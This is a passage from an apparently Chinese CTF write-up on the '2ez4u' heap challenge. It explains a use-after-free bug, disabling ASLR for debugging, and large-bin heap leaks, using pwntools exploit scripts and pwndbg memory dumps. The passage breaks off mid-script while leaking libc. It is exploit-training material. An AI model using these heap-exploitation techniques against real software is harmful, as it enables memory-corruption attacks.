class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">    io.sendline(str(value))</span><br><span class="line">    io.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">    io.sendline(str(num))</span><br><span class="line">    io.recvuntil(<span class="string">'description length?(1-1024):'</span>)</span><br><span class="line">    io.sendline(str(l))</span><br><span class="line">    io.recvuntil(<span class="string">'description of the apple:'</span>)</span><br><span class="line">    io.sendline(desc)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">'A'</span>*<span class="number">0x60</span>)</span><br><span class="line">io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">io.sendline(<span class="string">'5'</span>)</span><br></pre></td></tr></table></figure></li></ol><p>可以通过动态调试的方式检验自己的分析结果，对一开始还是蛮有帮助，熟悉了之后就不用了，这种菜单题的结构体大同小异。</p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-22-084525.png" alt=""></p><p>解释一下pwntools里面的几条语句</p><ul><li><code>context.log_level = &#39;DEBUG&#39;</code><br>打开debug,可以看到自己的发送和接收（如图）</li><li><code>io = process(&quot;./2ez4u&quot;, env = {&quot;LD_PRELOAD&quot; : &quot;./libc.so&quot;})</code><br>代表使用指定的libc文件去链接，<strong>不过要注意一下，因为ld.so的版本原因，跨版本指定libc一般是会失败的，所以这题的话，请使用ubuntu16.04</strong><br>如图：<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-22-084901.png" alt=""></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/ctf/chal$ python m_struct.py </span><br><span class="line">[+] Starting local process &apos;./2ez4u&apos; env=&#123;&apos;LD_PRELOAD&apos;: &apos;./libc.so&apos;&#125; : pid 9247</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">parallels@ubuntu:~/ctf/chal$ cat /proc/9247/maps</span><br></pre></td></tr></table></figure><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-22-090204.png" alt=""></p><ul><li>另外解释一下，base_addr=0x555555554000<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-22-090310.png" alt=""><br>这是代码段的基地址（这里主要就是用作调试，所以本地调试需要关闭ASLR,不然这个地址会变化。）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></li></ul><p>因为可以看到文件里都是按照偏移来写的地址。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-22-090334.png" alt=""></p><ul><li><p><code>gdb.attach(io, &#39;b *0x%x&#39; % (base_addr+0xD22))</code><br>使用gdb attach调试，b *是下断，这里我在malloc下断，attach上去之后再在里面下断也行，没区别。</p></li><li><p>另外使用IDA对二进制文件进行逆向分析的时候，可以把基地址重新选定，如下操作，可以看到现在基地址已经选定了。（注意这种情况下是在关闭ASLR调试时可以用，服务器上的地址并不是这个）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-22-094549.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-22-094610.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-22-094626.png" alt=""></p></li></ul><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>添加函数在上面已经分析了。<br>查看函数<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-22-151722.png" alt=""></p><p>删除函数<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-22-151812.png" alt=""><br>修改函数<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-22-101926.png" alt=""><br>可以看出在free chunk后并没有将存储指针的全局变量删除，还能够对其进行编辑，典型的UAF漏洞。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="leak-heap"><a href="#leak-heap" class="headerlink" title="leak heap"></a>leak heap</h3><p>首先构造两个大小在同一个bins中的large chunk，将其释放后，这两个chunk先进入unsorted bins中，再申请一个不满足这两个chunk大小的chunk，则unsorted bins中的这两个chunk将会进入large bins中。<br>同时fd_nextsize和bk_nextsize将被赋值，因为指向这两个chunk的指针还存放在全局变量中，所以依然可以打印（UAF）<br>调试脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_uint32</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'x86-64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./2ez4u"</span>, env = &#123;<span class="string">"LD_PRELOAD"</span> : <span class="string">"./libc.so"</span>&#125;)</span><br><span class="line"></span><br><span class="line">base_addr = <span class="number">0x0000555555554000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(l, desc)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'description length?(1-1024):'</span>)</span><br><span class="line">    io.sendline(str(l))</span><br><span class="line">    io.recvuntil(<span class="string">'description of the apple:'</span>)</span><br><span class="line">    io.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, desc)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1000'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">    io.sendline(<span class="string">'17'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'new description of the apple:'</span>)</span><br><span class="line">    io.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'0'</span>*<span class="number">0x60</span> ) <span class="comment"># </span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'1'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'2'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'3'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'4'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'5'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'6'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'7'</span>*<span class="number">0x3f0</span>) <span class="comment"># playground</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'8'</span>*<span class="number">0x30</span> )</span><br><span class="line">add(<span class="number">0x3e0</span>, <span class="string">'9'</span>*<span class="number">0x3d0</span>) <span class="comment"># sup</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'a'</span>*<span class="number">0x30</span> )</span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'b'</span>*<span class="number">0x3e0</span>) <span class="comment"># victim</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'c'</span>*<span class="number">0x30</span> )</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x9</span>)</span><br><span class="line">dele(<span class="number">0xb</span>)</span><br><span class="line">dele(<span class="number">0x0</span>)</span><br><span class="line">gdb.attach(io, <span class="string">'b *0x%x'</span> % (base_addr+<span class="number">0x124e</span>))</span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">'0'</span>*<span class="number">0x400</span>)</span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">show(<span class="number">0xb</span>)</span><br><span class="line">io.recvuntil(<span class="string">'num: '</span>)</span><br><span class="line">print(hex(c_uint32(int(io.recvline()[:<span class="number">-1</span>])).value))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'description:'</span>)</span><br><span class="line">HEAP = u64(io.recvline()[:<span class="number">-1</span>]+<span class="string">'\x00\x00'</span>)<span class="number">-0x7e0</span></span><br><span class="line">log.info(<span class="string">"heap base 0x%016x"</span> % HEAP)</span><br></pre></td></tr></table></figure></p><p>gdb挂上后，先查看全局变量,找到堆<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /32gx 0x555555756040</span><br><span class="line">0x555555756040:0x00000060000000000x0000555555757010        index:0</span><br><span class="line">0x555555756050:0x00000060000000010x0000555555757090        index:1</span><br><span class="line">0x555555756060:0x00000060000000010x0000555555757110        index:2</span><br><span class="line">0x555555756070:0x00000060000000010x0000555555757190        index:3</span><br><span class="line">0x555555756080:0x00000060000000010x0000555555757210        index:4</span><br><span class="line">0x555555756090:0x00000060000000010x0000555555757290        index:5</span><br><span class="line">0x5555557560a0:0x00000060000000010x0000555555757310        index:6</span><br><span class="line">0x5555557560b0:0x000003f0000000010x0000555555757390        index:7</span><br><span class="line">0x5555557560c0:0x00000030000000010x00005555557577a0        index:8</span><br><span class="line">0x5555557560d0:0x000003e0000000000x00005555557577f0        index:9</span><br><span class="line">0x5555557560e0:0x00000030000000010x0000555555757bf0        index:a</span><br><span class="line">0x5555557560f0:0x000003f0000000000x0000555555757c40        index:b</span><br><span class="line">0x555555756100:0x00000030000000010x0000555555758050        index:c</span><br><span class="line">0x555555756110:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756120:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756130:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-25-041558.png" alt=""></p><p>添加了一个large bin之后。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /32gx 0x555555756040</span><br><span class="line">0x555555756040:0x00000400000000010x00005555557580a0 ---&gt;new chunk</span><br><span class="line">0x555555756050:0x00000060000000010x0000555555757090</span><br><span class="line">0x555555756060:0x00000060000000010x0000555555757110</span><br><span class="line">0x555555756070:0x00000060000000010x0000555555757190</span><br><span class="line">0x555555756080:0x00000060000000010x0000555555757210</span><br><span class="line">0x555555756090:0x00000060000000010x0000555555757290</span><br><span class="line">0x5555557560a0:0x00000060000000010x0000555555757310</span><br><span class="line">0x5555557560b0:0x000003f0000000010x0000555555757390</span><br><span class="line">0x5555557560c0:0x00000030000000010x00005555557577a0</span><br><span class="line">0x5555557560d0:0x000003e0000000000x00005555557577f0</span><br><span class="line">0x5555557560e0:0x00000030000000010x0000555555757bf0</span><br><span class="line">0x5555557560f0:0x000003f0000000000x0000555555757c40</span><br><span class="line">0x555555756100:0x00000030000000010x0000555555758050</span><br><span class="line">0x555555756110:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756120:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756130:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>则index 9<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /20gx 0x00005555557577f0</span><br><span class="line">0x5555557577f0:0x00007ffff7dd1f68--&gt;fd（main_arena）    0x0000555555757c30--&gt;bk</span><br><span class="line">0x555555757800:0x0000555555757c30--&gt;fd_nextsize0x0000555555757c30--&gt;bk_nextsize</span><br><span class="line">0x555555757810:0x39393939393939390x3939393939393939</span><br><span class="line">0x555555757820:0x39393939393939390x3939393939393939</span><br><span class="line">0x555555757830:0x39393939393939390x3939393939393939</span><br><span class="line">0x555555757840:0x39393939393939390x3939393939393939</span><br><span class="line">0x555555757850:0x39393939393939390x3939393939393939</span><br><span class="line">0x555555757860:0x39393939393939390x3939393939393939</span><br><span class="line">0x555555757870:0x39393939393939390x3939393939393939</span><br><span class="line">0x555555757880:0x39393939393939390x3939393939393939</span><br></pre></td></tr></table></figure></p><p>index b<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /20gx 0x0000555555757c40</span><br><span class="line">0x555555757c40:0x00005555557577e0--&gt;fd                0x00007ffff7dd1f68--&gt;bk（main_arena,全局变量)</span><br><span class="line">0x555555757c50:0x00005555557577e0--&gt;fd_nextsize0x00005555557577e0--&gt;bk_nextsize</span><br><span class="line">0x555555757c60:0x62626262626262620x6262626262626262</span><br><span class="line">0x555555757c70:0x62626262626262620x6262626262626262</span><br><span class="line">0x555555757c80:0x62626262626262620x6262626262626262</span><br><span class="line">0x555555757c90:0x62626262626262620x6262626262626262</span><br><span class="line">0x555555757ca0:0x62626262626262620x6262626262626262</span><br><span class="line">0x555555757cb0:0x62626262626262620x6262626262626262</span><br><span class="line">0x555555757cc0:0x62626262626262620x6262626262626262</span><br><span class="line">0x555555757cd0:0x62626262626262620x6262626262626262</span><br></pre></td></tr></table></figure></p><p>即：chunk_size链为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">large bin: index b--&gt;index 9(--&gt;index b)</span><br></pre></td></tr></table></figure></p><p>此处–&gt;均代表bk_nextsize<br><strong>同时由fd和bk可以看出在large bin链中的顺序，判据如下图：</strong><br>index b的bk为main_arena,index 9的fd为main_arena<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-22-145329.png" alt=""></p><p>顺便index b大小为0x3e0,index 9的大小为0x3d0，b&gt;a，这也证明了large bin确实是从大到小排序的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x94 bytes:</span><br><span class="line">    00000000  63 6f 6c 6f  72 3a 20 67  72 65 65 6e  0a 6e 75 6d  │colo│r: g│reen│·num│</span><br><span class="line">    00000010  3a 20 32 31  38 34 35 0a  76 61 6c 75  65 3a 20 31  │: 21│845·│valu│e: 1│</span><br><span class="line">    00000020  30 34 0a 64  65 73 63 72  69 70 74 69  6f 6e 3a e0  │04·d│escr│ipti│on:·│</span><br><span class="line">    00000030  77 75 55 55  55 0a 0a 3d  3d 3d 3d 3d  20 63 68 61  │wuUU│U··=│====│ cha│</span><br><span class="line">    00000040  6c 6c 20 3d  3d 3d 3d 3d  0a 31 2e 20  61 64 64 20  │ll =│====│·1. │add │</span><br><span class="line">    00000050  61 70 70 6c  65 0a 32 2e  20 64 65 6c  20 61 70 70  │appl│e·2.│ del│ app│</span><br><span class="line">    00000060  6c 65 0a 33  2e 20 65 64  69 74 20 61  70 70 6c 65  │le·3│. ed│it a│pple│</span><br><span class="line">    00000070  0a 34 2e 20  73 68 6f 77  20 61 70 70  6c 65 0a 35  │·4. │show│ app│le·5│</span><br><span class="line">    00000080  2e 20 71 75  69 74 0a 79  6f 75 72 20  63 68 6f 69  │. qu│it·y│our │choi│</span><br><span class="line">    00000090  63 65 3a 20                                         │ce: ││</span><br><span class="line">    00000094</span><br></pre></td></tr></table></figure></p><h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_uint32</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'x86-64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./2ez4u"</span>, env = &#123;<span class="string">"LD_PRELOAD"</span> : <span class="string">"./libc.so"</span>&#125;)</span><br><span class="line"></span><br><span class="line">base_addr = <span class="number">0x0000555555554000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(l, desc)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'description length?(1-1024):'</span>)</span><br><span class="line">    io.sendline(str(l))</span><br><span class="line">    io.recvuntil(<span class="string">'description of the apple:'</span>)</span><br><span class="line">    io.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, desc)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1000'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">    io.sendline(<span class="string">'17'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'new description of the apple:'</span>)</span><br><span class="line">    io.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'0'</span>*<span class="number">0x60</span> ) <span class="comment"># </span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'1'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'2'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'3'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'4'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'5'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'6'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'7'</span>*<span class="number">0x3f0</span>) <span class="comment"># playground</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'8'</span>*<span class="number">0x30</span> )</span><br><span class="line">add(<span class="number">0x3e0</span>, <span class="string">'9'</span>*<span class="number">0x3d0</span>) <span class="comment"># sup</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'a'</span>*<span class="number">0x30</span> )</span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'b'</span>*<span class="number">0x3e0</span>) <span class="comment"># victim</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'c'</span>*<span class="number">0x30</span> )</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x9</span>)</span><br><span class="line">dele(<span class="number">0xb</span>)</span><br><span class="line">dele(<span class="number">0x0</span>)</span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">'0'</span>*<span class="number">0x400</span>)</span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">show(<span class="number">0xb</span>)</span><br><span class="line">io.recvuntil(<span class="string">'num: '</span>)</span><br><span class="line">print(hex(c_uint32(int(io.recvline()[:<span class="number">-1</span>])).value))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'description:'</span>)</span><br><span class="line">HEAP = u64(io.recvline()[:<span class="number">-1</span>]+<span class="string">'\x00\x00'</span>)<span class="number">-0x7e0</span></span><br><span class="line">log.info(<span class="string">"heap base 0x%016x"</span> % HEAP)</span><br><span class="line"></span><br><span class="line">target_addr = HEAP+<span class="number">0xb0</span>     <span class="comment"># 1</span></span><br><span 